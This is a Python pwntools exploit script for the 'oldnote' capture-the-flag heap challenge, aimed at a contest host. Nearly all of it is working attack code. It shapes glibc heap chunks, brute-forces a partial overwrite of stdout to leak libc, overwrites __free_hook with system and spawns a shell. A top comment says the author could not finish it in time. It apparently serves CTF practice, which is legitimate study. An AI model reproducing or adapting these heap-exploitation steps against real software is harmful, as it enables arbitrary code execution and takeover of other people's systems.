# I cant solve this on time.
# Make sure that we need to create symlink with "ln -s ./libc-2.26.so ./libc.so.6"
# Spawn shell will fail if you use "LD_PRELOAD=./libc.so.6". Use "--library-path ./" to avoid this.

from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './oldnote'
HOST = 'poseidonchalls.westeurope.cloudapp.azure.com'
PORT = 9000 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        # return process(TARGET)
        # return process(['./ld-2.26.so', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        return process(['./ld-2.26.so', '--library-path', './', TARGET])
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(size, name):
    r.sendlineafter('choice : ', '1')
    r.sendafter(': ', str(size))
    r.sendafter(': ', name)

def delete(idx):
    r.sendlineafter('choice : ', '2')
    r.sendlineafter(': ', str(idx))

while(1):
    r = start()
    alloc(0x10, 'A')
    alloc(0x10, 'B')
    alloc(0x28, 'CCCCCCCC')

    for i in range(5):
        alloc(0x10*i+0x88, 'x')
        delete(3)

    alloc(0xd8, p64(0x21)*(0xd8/8))
    delete(3)

    delete(0)
    alloc(-1, 'A'*0x18+p64(0x421))

    delete(2)
    delete(1)
    
    alloc(0x10, 'A') #0

    delete(0)
    alloc(-1, 'A'*0x38+p64(0x31)+'\x20\x57') # 1/16   #1

    alloc(0x28, 'hoge') #2
    try:
        alloc(0x28, p64(0xfbad1800)+'\x00'*0x18+'\x00')#3
        ret = r.recv(0x40)
        if 'read' in ret or '==' in ret:
            r.close()
            continue
        break
    except:
        r.close()

context.log_level = 'debug'
print hexdump(ret)
leak = u64(ret[0x18:0x20])
dbg('leak')
base = leak - 0x3d73e0
fh = base + 0x3dc8a8
system = base + 0x47dc0

if args.D:
    debug(r, [])

delete(2)
delete(0)
alloc(-1, 'A'*0x18+p64(0x21)+'B'*0x48+p64(0x91)+p64(fh)) #0
delete(1)

alloc(0x88, '/bin/sh\x00') #1
alloc(0x88, p64(system)) #3

delete(1)
r.interactive()
r.close()
